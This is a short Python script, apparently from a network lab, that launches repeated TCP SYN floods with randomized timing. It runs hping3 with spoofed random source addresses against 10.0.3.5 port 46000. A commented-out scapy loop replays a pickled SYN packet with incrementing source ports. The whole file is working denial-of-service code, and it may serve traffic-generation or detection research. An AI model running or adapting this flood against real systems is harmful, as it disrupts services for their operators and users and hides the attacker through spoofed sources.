from scapy.all import *
import random
import pickle
import pdb
from common import update_tcp_chksum

cmd = "hping3 --rand-source 10.0.3.5 -p 46000 -S -i u{} &"
while True:
    interval = random.randint(3000, 6000)  # 3000~6000 (1000 == 1ms)
    duration = random.randint(3000, 6000)  # 3000~6000 (ms)
    delay_ms = random.randint(500, 1000)   # 500~1000 (ms)
    
    print(f"command: {cmd.format(interval)}")
    os.system(cmd.format(interval))

    duration = duration/1000
    print(f"duration: {duration}s")
    time.sleep(duration)

    print("kill hping3")
    os.system("pkill hping3")

    delay = delay_ms/1000
    print(f"delay: {delay}s")
    time.sleep(delay)







'''
with open('syn_flood.pkl', 'rb') as f:
    syn_packet = pickle.load(f)
    syn_packet[IP].ttl = 11

def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

dst_ip = "10.0.3.5"
src_port = 3850
dst_port = 46000
interval = 1
src_mac = '00:00:00:00:00:08'
dst_mac = '00:00:00:00:00:05'

while True:
    #packet = Ether(src=src_mac, dst=dst_mac) / IP(src=random_ip(), dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="S")
    #packet[IP].ttl = 11
    syn_packet[TCP].sport = src_port
    syn_packet = update_tcp_chksum(syn_packet)
    sendp(syn_packet, iface='veth0.3', inter=interval)
    src_port += 1
'''
